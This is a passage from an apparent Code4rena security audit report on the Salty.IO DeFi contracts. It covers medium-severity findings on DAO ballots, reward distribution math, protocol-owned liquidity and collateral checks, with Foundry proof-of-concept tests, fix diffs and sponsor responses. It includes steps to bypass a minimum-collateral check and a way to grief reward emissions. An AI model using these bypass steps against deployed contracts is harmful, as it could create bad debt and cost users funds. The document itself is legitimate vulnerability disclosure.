        assertGt(proposals.requiredQuorumForBallotType(BallotType.INCLUDE_COUNTRY),stakeAmount, "Quorum exceeds stakeAmount" );
        assertTrue( proposals.userHasActiveProposal(alice), "Alice has an active proposal");
    }

    function _stakeSalt(address wallet, uint256 amount ) private {
        vm.startPrank( wallet );
        salt.approve(address(staking), amount);
        staking.stakeSALT(amount);
        vm.stopPrank();
    }
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Allow the proposals to be closed (equivalent to finalized as `NO` or `NO_CHANGE`), which would allow the sponsor to afterward make a different proposal.

*(This feature would also generally allow removing dead proposals)*

Add a time field to `Ballot` in [IProposals](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/interfaces/IProposals.sol):

```diff

	// The earliest timestamp at which a ballot can end. Can be open longer if the quorum has not yet been reached for instance.
	uint256 ballotMinimumEndTime;

+	// The earliest timestamp at which a ballot can be closed without quorum being reached.
+	uint256 ballotCloseTime;
	}
```

Populate the `ballotCloseTime` in [Proposal::\_possiblyCreateProposal](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L101-L111), using a constant in this example, it could always another DAO configuration option:

```diff
		// Make sure that a proposal of the same name is not already open for the ballot
		require( openBallotsByName[ballotName] == 0, "Cannot create a proposal similar to a ballot that is still open" );
		require( openBallotsByName[ string.concat(ballotName, "_confirm")] == 0, "Cannot create a proposal for a ballot with a secondary confirmation" );

		uint256 ballotMinimumEndTime = block.timestamp + daoConfig.ballotMinimumDuration();
+       uint256 ballotCloseTime = ballotMinimumEndTime + 1 weeks;		

		// Add the new Ballot to storage
		ballotID = nextBallotID++;
+		ballots[ballotID] = Ballot( ballotID, true, ballotType, ballotName, address1, number1, string1, string2, ballotMinimumEndTime );
+		ballots[ballotID] = Ballot( ballotID, true, ballotType, ballotName, address1, number1, string1, string2, ballotMinimumEndTime, ballotCloseTime );
		openBallotsByName[ballotName] = ballotID;
		_allOpenBallots.add( ballotID );		
```

Add a function to return whether a proposal can be closed to [Proposal](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L441):

```diff
+	function canCloseBallot( uint256 ballotID ) external view returns (bool)
+		{
+        Ballot memory ballot = ballots[ballotID];
+        if ( ! ballot.ballotIsLive )
+        	return false;
+
+        // Check that the minimum duration has passed
+        if (block.timestamp < ballot.ballotCloseTime )
+            return false;
+
+        return true;
+	    }
```

Add a function to close a ballot without any side effect to [DAO](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L381)

```diff
+   function closeBallot( uint256 ballotID ) external nonReentrant
+       {
+       // Checks that ballot is live and closeTime has passed
+		require( proposals.canCloseBallot(ballotID), "The ballot is not yet able to be closed" ); 
+
+       // No mutation from the propsal
+		_finalizeApprovalBallot(ballotID);
+       }
```

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/362#issuecomment-1950433590):**
 > There is now a default 30 day period after which ballots can be removed by any user.
> 
> https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0

**Status:** Mitigated with an Error. Full details in report from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-20] Some rewards from POL will not be send to team wallet nor burned](https://github.com/code-423n4/2024-01-salty-findings/issues/333)
*Submitted by [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/333), also found by [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/190)*

The rewards earned from the DAOs POL are distributed among the team wallet, then part of the remaining rewards are burned and the rest are kept as DAOs balance.

The issue, is that is possible for the DAO to claim SALT rewards without sending the team's share to the team wallet and without burning the amount that should be burned.

### Proof of Concept

The first step during the `upkeep` functionality is to perform the upkeep on the `liquidizer` contract.

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/Upkeep.sol#L107>

During that, if the amount of USDS to be burned is greater than the current balance of the `liquidizer` contract, then the code will withdraw some POL from the usds/dai and usds/salt pools:

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/Liquidizer.sol#L123-L124>

When removing liquidity, the code will decrease the dao's share and in doing so it will send to it some rewards proportional to the amount of shares decreased:

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L136-L137>

It is important note that pool rewards do not necessary comes from the emitter, but they can be added by third party protocols via the `addRewards` function in the `StakingRewards` contract:

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L182>

### Recommended Mitigation Steps

Two options:

*   Save the amount of rewards received when withdrawing some POL, so they can be distributed and burned.

*   Make the call to claim all the rewards at the beginning of `upkeep`.

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/333#issuecomment-1956687912):**
 > This report shows how in some cases some rewards may end up being stuck when withdrawing PoL.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/333#issuecomment-1960694018):**
 > POL has been removed from the protocol:
> 
> [eaf40ef0fa27314c6e674db6830990df68e5d70e](https://github.com/othernet-global/salty-io/commit/eaf40ef0fa27314c6e674db6830990df68e5d70e)
> https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed
> 

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/59), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/103), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/83).

***

## [[M-21] When forming POL the DAO will end up stucked with DAI and USDS tokens that cannot handle](https://github.com/code-423n4/2024-01-salty-findings/issues/324)
*Submitted by [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/324), also found by [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/952), [deepplus](https://github.com/code-423n4/2024-01-salty-findings/issues/875), [DanielArmstrong](https://github.com/code-423n4/2024-01-salty-findings/issues/843), and [KupiaSec](https://github.com/code-423n4/2024-01-salty-findings/issues/721)*

The DAO contract cannot handle any token beside SALT tokens. So, if tokens like USDS or DAI were in its balance, they will be lost forever.

This can happen during the `upkeep` calls. Basically, during upkeep the contract takes some percentage from the arbitrage profits and use them to form POL for the DAO (usds/dai and salt/usds). The DAO swaps the ETH for both of the needed tokens and then adds the liquidity using the zapping flag to true.

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L316-L324>

Zapping will compute the amount of either tokenA or tokenB to swap in order to add liquidity at the final ratio of reserves after the swap. But, it is important to note that the zap computations do no take into account that the same pool may get arbitraged atomically, changing the ratio of reserves a little.

As a consequence, some of the USDS and DAI tokens will be send back to the DAO contract:

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Liquidity.sol#L110C3-L115C1>

### Proof of Concept

The following coded PoC should be pasted into `root_tests/Upkeep.t.sol`, actually its the same test that can be found at the end of the file with some added lines to showcase the issue. Specifically, it shows how the USDS and DAI balance of the DAO are zero before upkeep and how both are greater than zero after upkeep.

<details>

```solidity
function testDoublePerformUpkeep() public {

        _setupLiquidity();
        _generateArbitrageProfits(false);

    	// Dummy WBTC and WETH to send to Liquidizer
    	vm.prank(DEPLOYER);
    	weth.transfer( address(liquidizer), 50 ether );

    	// Indicate that some USDS should be burned
    	vm.prank( address(collateralAndLiquidity));
    	liquidizer.incrementBurnableUSDS( 40 ether);

    	// Mimic arbitrage profits deposited as WETH for the DAO
    	vm.prank(DEPLOYER);
    	weth.transfer(address(dao), 100 ether);

    	vm.startPrank(address(dao));
    	weth.approve(address(pools), 100 ether);
    	pools.deposit(weth, 100 ether);
    	vm.stopPrank();

        // === Perform upkeep ===
        address upkeepCaller = address(0x9999);

        uint256 daiDaoBalanceBefore = dai.balanceOf(address(dao));
        uint256 usdsDaoBalanceBefore = usds.balanceOf(address(dao));

        assertEq(daiDaoBalanceBefore, 0);
        assertEq(usdsDaoBalanceBefore, 0);

        vm.prank(upkeepCaller);
        upkeep.performUpkeep();
        // ==================

        _secondPerformUpkeep();

        uint256 daiDaoBalanceAfter = dai.balanceOf(address(dao));
        uint256 usdsDaoBalanceAfter = usds.balanceOf(address(dao));

        assertTrue(daiDaoBalanceAfter > 0);
        assertTrue(usdsDaoBalanceAfter > 0);
}
```

</details>

### Recommended Mitigation Steps

The leftovers of USDS or DAI should be send to liquidizer so they can be handled.

**[othernet-global (Salty.IO) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/324#issuecomment-1950531010):**
 > The DAO contract uses the available token balances to form POL, ensuring no extra tokens left in the contract.
> 
> https://github.com/othernet-global/salty-io/commit/5364426aaf97e646fa3990f148e364167adcd0a5

 > POL has been removed from the protocol:
> 
> [eaf40ef0fa27314c6e674db6830990df68e5d70e](https://github.com/othernet-global/salty-io/commit/eaf40ef0fa27314c6e674db6830990df68e5d70e)
> https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed
> 

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/84), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/104), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/20).

***

## [[M-22] Minimium Collateral Check Can Be Bypassed](https://github.com/code-423n4/2024-01-salty-findings/issues/279)
*Submitted by [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/279), also found by [Audinarey](https://github.com/code-423n4/2024-01-salty-findings/issues/1010), [Giorgio](https://github.com/code-423n4/2024-01-salty-findings/issues/700), and [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/348)*

The minimum collateral is enforced to prevent a well known vulnerability - there is no incentive to liquidate small loans. Therefore the impact of this check being bypassed is the same - small loans will not be liquidated which can lead to bad debt in the protocol.

### Proof of Concept

The minimum collateral is enforced in the when borrowing USDS, during the call to the `maxBorrowableUSDS` function. However this check is not applied when the user withdraws collateral. Therefore, a loan with small collateral can be created by:

1.  depositing collateral greater than the minimum collateral
2.  taking out a small loan
3.  withdrawing collateral so that the position is now under the minimum collateral threshold.

**Why small loans are an issue:**

The liquidation reward is based off a flat 5% of the collateral being liquidated. There is no minimum cap to the liquidation fee.

Let's have an example where gas costs are `$5`. The collateral being liquidated needs to be `$100 USDS` or more for the liquidation costs to be worth the reward.

However, a loan that is worth `$100` at liquidation is actually worth far more than that upon time of opening. For example, opened at the minimum collateral factor of 200%, the loan is actually worth slightly less than `$200` when it was opened, and then decreased to `$100`. With even lower-leverage positions with 400% CF, it is reasonable that position sizes are `$400` or more upon time of opening.

### Recommended Mitigation Steps

The minimum collateral should be enforced on withdrawals whenever a user has an active USDS loan.

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/279#issuecomment-1943235725):**
 > To me medium severity is more appropriate here under "leak value with a hypothetical attack path with stated assumptions, but external requirements" and "broken functionality".
> 
> Indeed this could lead to bad debt but the attack is hardly profitable at any point in time as the gas costs to setup small loans is expensive (you need to add collateral, borrow, repay, withdraw) and unless the oracle is flawed you can't have a guarantee that the attack will profitable.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/279#issuecomment-1960691322):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/21), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/105), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/85).

***

## [[M-23] StakingRewards pools are not given their promised share of rewards due to incorrect calculation](https://github.com/code-423n4/2024-01-salty-findings/issues/243)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/243), also found by [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/282) and [0xAsen](https://github.com/code-423n4/2024-01-salty-findings/issues/252)*

[RewardsEmitter::performUpkeep()](https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/RewardsEmitter.sol#L82) distributes the added rewards to the eligible staking pools at the rate of `X%` per day (default value set to 1% by the protocol). To ensure that once disbursed, it is not sent again, the code reduces the `pendingRewards[poolID]` variable on [L126](https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/RewardsEmitter.sol#L126):

```js
120			// Each pool will send a percentage of the pending rewards based on the time elapsed since the last send
121			uint256 amountToAddForPool = ( pendingRewards[poolID] * numeratorMult ) / denominatorMult;
122
123			// Reduce the pending rewards so they are not sent again
124			if ( amountToAddForPool != 0 )
125				{
126				pendingRewards[poolID] -= amountToAddForPool;
127
128				sum += amountToAddForPool;
129				}
```

The impact of this is: ***higher the number of times performUpkeep() is called, lesser the rewards per day is distributed to the pools.*** That is, calling it 100 times a day is worse than calling it once at the end of the day. This is at odds with how the protocol wants to achieve a higher frequency of upkeep-ing. <br>

Reasoning:<br>
This above code logic is incorrect maths as doing this will result in the following scenario:

*   Suppose that on Day0, the `addedRewards = 10 ether` and `rewardsEmitterDailyPercentTimes1000 = 2500` i.e. 2.5% per day. One would expect all rewards to be distributed to the pool after 40 days (since 2.5% \* 40 = 100%).
*   On Day1, `performUpkeep()` gets called. `amountToAddForPool` and `pendingRewards[poolID]` are calculated on L121 & L126 respectively as:
    *   `amountToAddForPool = 0.025 * 10 ether = 0.25 ether`
    *   `pendingRewards[poolID] = 10 ether - 0.25 ether = 9.75 ether`
*   On Day2, `performUpkeep()` gets called again. `amountToAddForPool` and `pendingRewards[poolID]` are calculated now as:
    *   `amountToAddForPool = 0.025 * 9.75 ether = 0.24375 ether`
    *   `pendingRewards[poolID] = 9.75 ether - 0.24375 ether = 9.50625 ether`

So on and so forth for each new day. The actual formula being followed is `totalRewardsStillRemainingAfterXdays = 10 ether * (1 - 2.5%)**X` which would be `3632324398878806621` or `3.63232 ether` after 40 days. In fact, even after another 40 days, it's still not all paid out. Please refer the ***"Proof of Concept - 1"*** provided below. In fact, since this is a classic negative compounding formula ( $Amount = Principle \* (1 - rate)^{time}$ ), no matter how many days pass, all the rewards would never be distributed and dust would always remain in the contract.

### Further Evidence & Impact

To remove any doubts regarding the interpretation of the `1% per day rate` and if indeed the current implementation is as intended or not, one can look at the following calculation provided in the comments:<br>
[StakingRewards.sol#L178-L181](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L178-L181)

```js
	// 3. Rewards are first placed into a RewardsEmitter which deposits rewards via addSALTRewards at the default rate of 1% per day.
	// 4. Rewards are deposited fairly often, with outstanding rewards being transferred with a frequency proportional to the activity of the exchange.
	// Example: if $100k rewards were being deposited in a bulk transaction, it would only equate to $1000 (1%) the first day,
	// or $10 in claimable rewards during a 15 minute upkeep period.
```

Let's crunch the above numbers:

*   The comment says, `"$100K rewards would equate to $1000 (1%) the first day"` **OR** "`$10 claimable rewards`" when upkeep() is called every 15 minutes.
*   This conclusion could have been arrived at by the protocol only when the reward of `$1000` (over 24 hours) is divided equally for each 15 minutes i.e. `$1000 / (24 * 60 / 15)` equalling `$10` (rounded-down).

This is certainly not the case currently as can be seen in the ***"Proof of Concept - 2"***. <br><br>

**Note** that this means that per day much lesser rewards than 1% are distributed if `performUpkeep()` is called every 15 minutes instead of once after 24 hours. A malicious actor can use this to grief the protocol and delay/diminish emissions. The power of negative compunding causes this and can be seen in the second PoC.

### Proof of Concept - 1

Add the following test inside `src/rewards/tests/RewardsEmitter.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_allPendingRewardsNeverPaidOut` to see the two assertions fail. The value of `rewardsEmitterDailyPercentTimes1000` in the test is 2.5% per day.<br>

<Details>

```js
    function test_allPendingRewardsNeverPaidOut() public {

        // Add some pending rewards to the pools
        AddedReward[] memory addedRewards = new AddedReward[](1);
        addedRewards[0] = AddedReward({poolID: poolIDs[0], amountToAdd: 10 ether});
        liquidityRewardsEmitter.addSALTRewards(addedRewards);

        // Verify that the rewards were added
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 10 ether);

        // Call performUpkeep
        vm.startPrank(address(upkeep));
        for (uint256 i; i < 40; ++i)
            liquidityRewardsEmitter.performUpkeep(1 days);
        vm.stopPrank();

        // Verify that the correct amount of rewards were deducted from each pool's pending rewards
        // 2.5% of the rewards should be deducted per day, so all rewards should be paid out after the 40 days' iteration above
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 0 ether, "not all reward distributed");


        // Let's try 40 times more, just to confirm the behaviour and see if ever all the rewards are paid out
        vm.startPrank(address(upkeep));
        for (uint256 i; i < 40; ++i)
            liquidityRewardsEmitter.performUpkeep(1 days);
        vm.stopPrank();
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 0 ether, "nope, not even now");
    }
```

Output:

```text
[FAIL. Reason: assertion failed] test_allPendingRewardsNeverPaidOut() (gas: 5441491)
Logs:
  Error: not all reward distributed
  Error: a == b not satisfied [uint]
        Left: 3632324398878806621
       Right: 0
  Error: nope, not even now
  Error: a == b not satisfied [uint]
        Left: 1319378053869028394
       Right: 0
```

</details>

### Proof of Concept - 2

Add the following test inside `src/rewards/tests/RewardsEmitter.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_perDayDefaultRateNotAdheredTo` to see last assertion fail. The value of `rewardsEmitterDailyPercentTimes1000` in the test is 1% per day and `upkeep()` is called every 15 minutes.<br>
**We observe that by the end of the day, `4931 ethers` less is disbursed than expected.**

<details>

```js
    function test_perDayDefaultRateNotAdheredTo() public {
        // set daily rate to 1%
        vm.startPrank(address(dao));
		for ( uint256 i = 0; i < 6; i++ )
			rewardsConfig.changeRewardsEmitterDailyPercent(false);
		vm.stopPrank();
        assertEq(rewardsConfig.rewardsEmitterDailyPercentTimes1000(), 1000);

        // Add some pending rewards to the pools
        deal(address(salt), address(this), 100_000_000 ether);
        AddedReward[] memory addedRewards = new AddedReward[](1);
        addedRewards[0] = AddedReward({poolID: poolIDs[0], amountToAdd: 100_000_000 ether});
        liquidityRewardsEmitter.addSALTRewards(addedRewards);
        // Verify that the rewards were added
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 100_000_000 ether);

        // Call performUpkeep every 15 minutes for a full day
        uint256 totalDisbursed = 0;
        uint256 disbursedInLast15Mins = pendingLiquidityRewardsForPool(poolIDs[0]);
        console.log("Time Lapsed ( in mins)        |       Reward emiited in last 15 mins      |       Total reward emitted");
        vm.startPrank(address(upkeep));
        for (uint256 i; i < 24 * 4; ++i) {
            liquidityRewardsEmitter.performUpkeep(15 minutes);
            uint256 diff = disbursedInLast15Mins - pendingLiquidityRewardsForPool(poolIDs[0]);
            totalDisbursed += diff;
            console.log("%s                        |          %s         |          %s", (i+1)*15, diff, totalDisbursed); 
            disbursedInLast15Mins = pendingLiquidityRewardsForPool(poolIDs[0]);
        }
        vm.stopPrank();

        // Verify that the correct amount of rewards were deducted from each pool's pending rewards
        // 1% of the rewards should be deducted per day
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 99_000_000 ether, "1% per day not adhered to");
    }
```

Output:

```text
[FAIL. Reason: assertion failed] test_perDayDefaultRateNotAdheredTo() (gas: 7243619)
Logs:
  Time Lapsed ( in mins)        |       Reward emiited in last 15 mins      |       Total reward emitted
  15                        |          10416666666666666666666         |          10416666666666666666666
  30                        |          10415581597222222222222         |          20832248263888888888888
  45                        |          10414496640805844907407         |          31246744904694733796295
  60                        |          10413411797405760965229         |          41660156702100494761524
  75                        |          10412327067010197865129         |          52072483769110692626653
  90                        |          10411242449607384302851         |          62483726218718076929504
  105                        |          10410157945185550200319         |          72893884163903627129823
  120                        |          10409073553732926705507         |          83302957717636553835330
  135                        |          10407989275237746192308         |          93710946992874300027638
  150                        |          10406905109688242260413         |          104117852102562542288051
  165                        |          10405821057072649735178         |          114523673159635192023229
  180                        |          10404737117379204667497         |          124928410277014396690726
  195                        |          10403653290596144333678         |          135332063567610541024404
  210                        |          10402569576711707235309         |          145734633144322248259713
  225                        |          10401485975714133099139         |          156136119120036381358852
  240                        |          10400402487591662876941         |          166536521607628044235793
  255                        |          10399319112332538745392         |          176935840719960582981185
  270                        |          10398235849925004105939         |          187334076569885587087124
  285                        |          10397152700357303584678         |          197731229270242890671802
  300                        |          10396069663617683032221         |          208127298933860573704023
  315                        |          10394986739694389523572         |          218522285673554963227595
  330                        |          10393903928575671357997         |          228916189602130634585592
  345                        |          10392821230249778058897         |          239309010832380412644489
  360                        |          10391738644704960373682         |          249700749477085373018171
  375                        |          10390656171929470273643         |          260091405649014843291814
  390                        |          10389573811911560953823         |          270480979460926404245637
  405                        |          10388491564639486832891         |          280869471025565891078528
  420                        |          10387409430101503553012         |          291256880455667394631540
  435                        |          10386327408285867979725         |          301643207863953262611265
  450                        |          10385245499180838201811         |          312028453363134100813076
  465                        |          10384163702774673531165         |          322412617065908774344241
  480                        |          10383082019055634502672         |          332795699084964408846913
  495                        |          10382000448011982874078         |          343177699532976391720991
  510                        |          10380918989631981625862         |          353558618522608373346853
  525                        |          10379837643903894961109         |          363938456166512268307962
  540                        |          10378756410815988305384         |          374317212577328256613346
  555                        |          10377675290356528306602         |          384694887867684784919948
  570                        |          10376594282513782834904         |          395071482150198567754852
  585                        |          10375513387276020982525         |          405446995537474588737377
  600                        |          10374432604631513063673         |          415821428142106101801050
  615                        |          10373351934568530614395         |          426194780076674632415445
  630                        |          10372271377075346392456         |          436567051453749978807901
  645                        |          10371190932140234377207         |          446938242385890213185108
  660                        |          10370110599751469769459         |          457308352985641682954567
  675                        |          10369030379897328991358         |          467677383365539011945925
  690                        |          10367950272566089686255         |          478045333638105101632180
  705                        |          10366870277746030718579         |          488412203915851132350759
  720                        |          10365790395425432173713         |          498777994311276564524472
  735                        |          10364710625592575357862         |          509142704936869139882334
  750                        |          10363630968235742797928         |          519506335905104882680262
  765                        |          10362551423343218241387         |          529868887328448100921649
  780                        |          10361471990903286656153         |          540230359319351387577802
  795                        |          10360392670904234230460         |          550590751990255621808262
  810                        |          10359313463334348372728         |          560950065453589970180990
  825                        |          10358234368181917711439         |          571308299821771887892429
  840                        |          10357155385435232095011         |          581665455207207119987440
  855                        |          10356076515082582591667         |          592021531722289702579107
  870                        |          10354997757112261489314         |          602376529479401964068421
  885                        |          10353919111512562295409         |          612730448590914526363830
  900                        |          10352840578271779736837         |          623083289169186306100667
  915                        |          10351762157378209759781         |          633435051326564515860448
  930                        |          10350683848820149529597         |          643785735175384665390045
  945                        |          10349605652585897430688         |          654135340827970562820733
  960                        |          10348527568663753066372         |          664483868396634315887105
  975                        |          10347449597042017258761         |          674831317993676333145866
  990                        |          10346371737708992048630         |          685177689731385325194496
  1005                        |          10345293990652980695292         |          695522983722038305889788
  1020                        |          10344216355862287676469         |          705867200077900593566257
  1035                        |          10343138833325218688170         |          716210338911225812254427
  1050                        |          10342061423030080644556         |          726552400334255892898983
  1065                        |          10340984124965181677823         |          736893384459221074576806
  1080                        |          10339906939118831138064         |          747233291398339905714870
  1095                        |          10338829865479339593154         |          757572121263819245308024
  1110                        |          10337752904035018828613         |          767909874167854264136637
  1125                        |          10336676054774181847485         |          778246550222628445984122
  1140                        |          10335599317685142870209         |          788582149540313588854331
  1155                        |          10334522692756217334494         |          798916672233069806188825
  1170                        |          10333446179975721895188         |          809250118413045528084013
  1185                        |          10332369779331974424157         |          819582488192377502508170
  1200                        |          10331293490813294010155         |          829913781683190796518325
  1215                        |          10330217314408000958696         |          840243998997598797477021
  1230                        |          10329141250104416791929         |          850573140247703214268950
  1245                        |          10328065297890864248513         |          860901205545594078517463
  1260                        |          10326989457755667283487         |          871228195003349745800950
  1275                        |          10325913729687151068145         |          881554108733036896869095
  1290                        |          10324838113673641989909         |          891878946846710538859004
  1305                        |          10323762609703467652202         |          902202709456414006511206
  1320                        |          10322687217764956874321         |          912525396674178963385527
  1335                        |          10321611937846439691314         |          922847008612025403076841
  1350                        |          10320536769936247353846         |          933167545381961650430687
  1365                        |          10319461714022712328080         |          943487007095984362758767
  1380                        |          10318386770094168295545         |          953805393866078531054312
  1395                        |          10317311938138950153015         |          964122705804217481207327
  1410                        |          10316237218145394012374         |          974438943022362875219701
  1425                        |          10315162610101837200497         |          984754105632464712420198
  1440                        |          10314088113996618259122         |          995068193746461330679320
  Error: 1% per day not adhered to
  Error: a == b not satisfied [uint]
        Left: 99004931806253538669320680
       Right: 99000000000000000000000000
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Store the eligible pool reward & the already paid out reward in separate variables and compare them to make sure extra rewards are not being paid out to a pool.
Irrespective of the `performUpkeep()` calling frequency, at the end of the day, 1% should be disbursed.


**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/243#issuecomment-1956839550):**
 > Medium severity seems more appropriate considering this only concerns rewards and is subject to external conditions.

**[othernet-global (Salty.IO) acknowledged](https://github.com/code-423n4/2024-01-salty-findings/issues/243#issuecomment-1960670620)**

***

## [[M-24] Salt Rewards - Rewards related to Arbitrage profits for pools can be lost](https://github.com/code-423n4/2024-01-salty-findings/issues/239)
*Submitted by [zzebra83](https://github.com/code-423n4/2024-01-salty-findings/issues/239)*

Arbitrage profits are distributed to pools that played a part in generating them. This is distributed via calling the performUpkeep function with upkeep.sol.

The process of upkeep is multi step, and any failure in any step does not disable next steps to trigger because each step is wrapped in a try catch. lets delve into steps 5 and 7.

    	// 5. Convert remaining WETH to SALT and sends it to SaltRewards.
    function step5() public onlySameContract
    	{
    	uint256 wethBalance = weth.balanceOf( address(this) );
    	if ( wethBalance == 0 )
    		return;

    	// Convert remaining WETH to SALT and send it to SaltRewards
    	// @audit arbitrage profits sent to saltrewards here, pools contract
    	// has allowance to withdrawm unlimited WETH from the upkeep contract
    	// but this swap operation can fail, if arbitrage profits are too large
    	// and not enough reserves of salt are there
    	uint256 amountSALT = pools.depositSwapWithdraw( weth, salt, wethBalance, 0, block.timestamp );
    	salt.safeTransfer(address(saltRewards), amountSALT);
    	}

step 5 converts the arbitrage profits from WETH to Salt. Next, after which they are distributed to SaltRewards contract. If the operation to swap WETH to Salt fails due to reserves going below dust for example, then no Salt will be transferred to the salt rewards contract. this will impact step 7.

    	// 7. Distribute SALT from SaltRewards to the stakingRewardsEmitter and liquidityRewardsEmitter.
    function step7() public onlySameContract
    	{
    	// @audit line below can return a list with arbitrage profits assigned for a pool
    	uint256[] memory profitsForPools = pools.profitsForWhitelistedPools();

    	bytes32[] memory poolIDs = poolsConfig.whitelistedPools();
    	// @audit if more than 1 week passed, less rewards passed to the emitters in step 8.
    	saltRewards.performUpkeep(poolIDs, profitsForPools );
    	// @audit can arbitrage profits be cleared without distributing?
    	pools.clearProfitsForPools();
    	}

Step 6 will distribute the salt emissions to the saltrewards contract.  so the saltrewards contract will have only salt related to emissions but not arbitrage profits.

Step 7 will distribute all salt rewards(including those arbitrage profits in Salt to all the pools) via calling performUpkeep function in salt rewards contrat, but this assumes the SaltRewards contract will have a salt balance containing the arbitrage profits (from step 5), which might not be the case.

    		uint256 saltRewardsToDistribute = salt.balanceOf(address(this));
    	if ( saltRewardsToDistribute == 0 ){ // @audit function simply returns, this could be problematic
    		return;
    	}

    	// Determine the total profits so we can calculate proportional share for the liquidity rewards
    	uint256 totalProfits = 0;
    	for( uint256 i = 0; i < poolIDs.length; i++ ) {
    		totalProfits += profitsForPools[i];
    	}

    	// Make sure that there are some profits to determine the proportional liquidity rewards.
    	// Otherwise just handle the SALT balance later so it can be divided between stakingRewardsEmitter and liquidityRewardsEmitter without further accounting.
    	if ( totalProfits == 0 ) {
    		return;
    	}

    	// Determine how much of the SALT rewards will be directly awarded to the SALT/USDS pool.
    	// This is because SALT/USDS is important, but not included in other arbitrage trades - which would normally yield additional rewards for the pool by being part of arbitrage swaps.
    	uint256 directRewardsForSaltUSDS = ( saltRewardsToDistribute * rewardsConfig.percentRewardsSaltUSDS() ) / 100;
    	uint256 remainingRewards = saltRewardsToDistribute - directRewardsForSaltUSDS;

    	// Divide up the remaining rewards between SALT stakers and liquidity providers
    	uint256 stakingRewardsAmount = ( remainingRewards * rewardsConfig.stakingRewardsPercent() ) / 100;
    	uint256 liquidityRewardsAmount = remainingRewards - stakingRewardsAmount;
    	_sendStakingRewards(stakingRewardsAmount);
    	_sendLiquidityRewards(liquidityRewardsAmount, directRewardsForSaltUSDS, poolIDs, profitsForPools, totalProfits); // @audit salt rewards for liquidity will not include amounts related to pool arbitrate profits

As you can see above, the performupkeep checks the contracts salt balance and based off that the liquidity rewards amounts are determined. but given that actual balance does not include those profits, these figures will be inaccurate.

It would then return back to step 7 and 'Clear' the profits assigned to each pool via calling pools.clearProfitsForPools().

This essentially means that profits assigned to pools are cleared from storage without actually being distributed fairly as Salt rewards to pool liquidity providers.

